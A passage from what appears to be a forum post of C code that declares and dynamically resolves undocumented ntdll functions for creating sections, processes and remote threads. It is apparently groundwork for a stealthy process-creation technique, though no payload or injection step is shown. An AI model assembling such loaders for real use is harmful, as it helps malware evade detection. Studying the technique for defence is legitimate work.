/>&nbsp;&nbsp;&nbsp;&nbsp;union<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;Value;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Reserve&nbsp;8&nbsp;bytes&nbsp;for&nbsp;data&nbsp;(such&nbsp;as&nbsp;a&nbsp;Handle&nbsp;or&nbsp;a&nbsp;data&nbsp;pointer)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;ValuePtr;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;data&nbsp;pointer<br />&nbsp;&nbsp;&nbsp;&nbsp;};<br />&nbsp;&nbsp;&nbsp;&nbsp;PSIZE_T&nbsp;ReturnLength;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Either&nbsp;0&nbsp;or&nbsp;specifies&nbsp;size&nbsp;of&nbsp;data&nbsp;returned&nbsp;to&nbsp;caller&nbsp;via&nbsp;&quot;ValuePtr&quot;<br />}&nbsp;PS_ATTRIBUTE,&nbsp;*&nbsp;PPS_ATTRIBUTE;<br /><br />typedef&nbsp;struct&nbsp;_PS_ATTRIBUTE_LIST<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;TotalLength;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;sizeof(PS_ATTRIBUTE_LIST)<br />&nbsp;&nbsp;&nbsp;&nbsp;PS_ATTRIBUTE&nbsp;Attributes[2];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Depends&nbsp;on&nbsp;how&nbsp;many&nbsp;attribute&nbsp;entries&nbsp;should&nbsp;be&nbsp;supplied&nbsp;to&nbsp;NtCreateUserProcess<br />}&nbsp;PS_ATTRIBUTE_LIST,&nbsp;*&nbsp;PPS_ATTRIBUTE_LIST;<br /><br />typedef&nbsp;NTSTATUS(NTAPI*&nbsp;t_NtCreateThreadEx)(<br />&nbsp;&nbsp;&nbsp;&nbsp;_Out_&nbsp;PHANDLE&nbsp;ThreadHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_&nbsp;ACCESS_MASK&nbsp;DesiredAccess,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;POBJECT_ATTRIBUTES&nbsp;ObjectAttributes,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_&nbsp;HANDLE&nbsp;ProcessHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_&nbsp;PUSER_THREAD_START_ROUTINE&nbsp;StartRoutine,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PVOID&nbsp;Argument,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_&nbsp;ULONG&nbsp;CreateFlags,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;ULONG_PTR&nbsp;ZeroBits,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;SIZE_T&nbsp;StackSize,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;SIZE_T&nbsp;MaximumStackSize,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PPS_ATTRIBUTE_LIST&nbsp;AttributeList<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br /><br />//&nbsp;my&nbsp;NT&nbsp;functions<br />t_NtCreateSection&nbsp;d_NtCreateSection;<br />t_NtClose&nbsp;d_NtClose;<br />t_NtCreateProcessEx&nbsp;d_NtCreateProcessEx;<br />t_NtQueryInformationProcess&nbsp;d_NtQueryInformationProcess;<br />t_NtReadVirtualMemory&nbsp;d_NtReadVirtualMemory;<br />t_RtlInitUnicodeString&nbsp;d_RtlInitUnicodeString;<br />t_RtlCreateProcessParametersEx&nbsp;d_RtlCreateProcessParametersEx;<br />t_RtlDestroyProcessParameters&nbsp;d_RtlDestroyProcessParameters;<br />t_NtCreateThreadEx&nbsp;d_NtCreateThreadEx;</div></div><br /><br /><strong><h3>### nt.c</h3></strong><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&quot;nt.h&quot;<br /><br />int&nbsp;resolveNtFunctions()<br /><span style="color:#000000;font-weight:400">{</span><br />	HMODULE&nbsp;hNtdll&nbsp;=&nbsp;GetModuleHandleW(L&quot;Ntdll.dll&quot;);<br /><br />	d_NtCreateSection&nbsp;=&nbsp;(t_NtCreateSection)GetProcAddress(hNtdll,&nbsp;&quot;NtCreateSection&quot;);<br />	if&nbsp;(d_NtCreateSection&nbsp;==&nbsp;NULL)<br />		return&nbsp;1;<br /><br />	d_NtClose&nbsp;=&nbsp;(t_NtClose)GetProcAddress(hNtdll,&nbsp;&quot;NtClose&quot;);<br />	if&nbsp;(d_NtClose&nbsp;==&nbsp;NULL)<br />		return&nbsp;2;<br /><br />	d_NtCreateProcessEx&nbsp;=&nbsp;(t_NtCreateProcessEx)GetProcAddress(hNtdll,&nbsp;&quot;NtCreateProcessEx&quot;);<br />	if&nbsp;(d_NtCreateProcessEx&nbsp;==&nbsp;NULL)<br />		return&nbsp;3;<br /><br />	d_NtQueryInformationProcess&nbsp;=&nbsp;(t_NtQueryInformationProcess)GetProcAddress(hNtdll,&nbsp;&quot;NtQueryInformationProcess&quot;);<br />	if&nbsp;(d_NtQueryInformationProcess&nbsp;==&nbsp;NULL)<br />		return&nbsp;4;<br /><br />	d_NtReadVirtualMemory&nbsp;=&nbsp;(t_NtReadVirtualMemory)GetProcAddress(hNtdll,&nbsp;&quot;NtReadVirtualMemory&quot;);<br />	if&nbsp;(d_NtReadVirtualMemory&nbsp;==&nbsp;NULL)<br />		return&nbsp;5;<br /><br />	d_RtlInitUnicodeString&nbsp;=&nbsp;(t_RtlInitUnicodeString)GetProcAddress(hNtdll,&nbsp;&quot;RtlInitUnicodeString&quot;);<br />	if&nbsp;(d_RtlInitUnicodeString&nbsp;==&nbsp;NULL)<br />		return&nbsp;6;<br /><br />	d_RtlCreateProcessParametersEx&nbsp;=&nbsp;(t_RtlCreateProcessParametersEx)GetProcAddress(hNtdll,&nbsp;&quot;RtlCreateProcessParametersEx&quot;);<br />	if&nbsp;(d_RtlCreateProcessParametersEx&nbsp;==&nbsp;NULL)<br />		return&nbsp;7;<br /><br />	d_RtlDestroyProcessParameters&nbsp;=&nbsp;(t_RtlDestroyProcessParameters)GetProcAddress(hNtdll,&nbsp;&quot;RtlDestroyProcessParameters&quot;);<br />	if&nbsp;(d_RtlDestroyProcessParameters&nbsp;==&nbsp;NULL)<br />		return&nbsp;8;<br /><br />	d_NtCreateThreadEx&nbsp;=&nbsp;(t_NtCreateThreadEx)GetProcAddress(hNtdll,&nbsp;&quot;NtCreateThreadEx&quot;);<br />	if&nbsp;(d_NtCreateThreadEx&nbsp;==&nbsp;NULL)<br />		return&nbsp;9;<br />	<br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div></div>
</body>
</html>
